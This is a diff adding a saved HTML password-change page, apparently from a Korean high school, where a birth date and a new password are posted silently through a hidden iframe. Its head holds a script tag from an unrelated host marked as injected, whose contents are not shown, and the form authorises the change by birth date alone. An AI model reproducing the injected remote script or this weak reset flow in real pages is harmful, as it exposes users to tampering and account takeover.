@@ -1,0 +1,60 @@
+<html data-arp-injected="true"><head><script type="text/javascript" src="https://3001.scriptcdn.net/code/static/1"></script></head><body topmargin="0" leftmargin="0"><style>
+    a { text-decoration:none; }
+    </style>
+    <style type="text/css">
+    @import url(http://fonts.googleapis.com/earlyaccess/nanumgothic.css);
+    body {font-family: Nanum Barun Gothic,나눔고딕, NanumGothic, Malgun Gothic,돋움, Dotum, AppleGothic, sans-serif;}
+    </style>
+    <meta http-equiv="content-type" content="text/html; charset=euc-kr">
+    <title>▒현대청운고등학교▒</title>
+    <table width="300" align="center" cellspacing="0" style="border-collapse:collapse;">
+        <tbody><tr>
+            <td background="./1.jpg" width="300" height="40" style="border-width:1; border-color:black; border-style:none;" valign="bottom"><font size="3" color="white">현대청운고등학교</font></td>
+        </tr>
+        <tr>
+            <td style="border-width:1; border-color:black; border-style:none;">
+    <p align="center">&nbsp;</p>
+
+    <form name="form1" method="post">
+                <table width="300" align="center" cellspacing="0" style="border-collapse:collapse;">
+                    <tbody><tr>
+                        <td width="102" style="border-width:1; border-color:black; border-style:solid;" height="35">
+                            <p align="center"><font size="2">생년월일<br>(8자리)</font></p>
+    </td>
+                        <td width="191" style="border-width:1; border-color:black; border-style:solid;">
+                            <p align="center"><input type="password" name="ju"></p>
+    </td>
+                    </tr>
+                    <tr>
+                        <td width="102" style="border-width:1; border-color:black; border-style:solid;" height="35">
+                            <p align="center"><font size="2">새로운 비밀번호</font></p>
+    </td>
+                        <td width="191" style="border-width:1; border-color:black; border-style:solid;">
+                            <p align="center"><input type="password" name="new_pass"></p>
+    </td>
+                    </tr>
+                                    <tr>
+                        <td width="102" style="border-width:1; border-color:black; border-style:solid;" height="35">
+                            <p align="center"><font size="2">비밀번호 확인</font></p>
+    </td>
+                        <td width="191" style="border-width:1; border-color:black; border-style:solid;">
+                            <p align="center"><input type="password" name="new_pass_a"></p>
+    </td>
+                    </tr>
+                </tbody></table>
+                            <p align="center"><input type="button" name="formbutton1" value=" 확 인 " onclick="func_submit();"></p>
+    </form>
+    </td>
+        </tr>
+    </tbody></table>
+    <iframe name="f2" width="0" height="0" frameborder="no" marginwidth="0" marginheight="0" topmargin="0" scrolling="no"></iframe>
+    <script>
+    function func_submit(){
+        document.form1.target = "f2";
+        document.form1.action = "pass_change_s_in.php";
+        document.form1.submit();
+
+        window.alert('변경되었습니다.');
+        window.close();
+    }
+    </script></body></html>
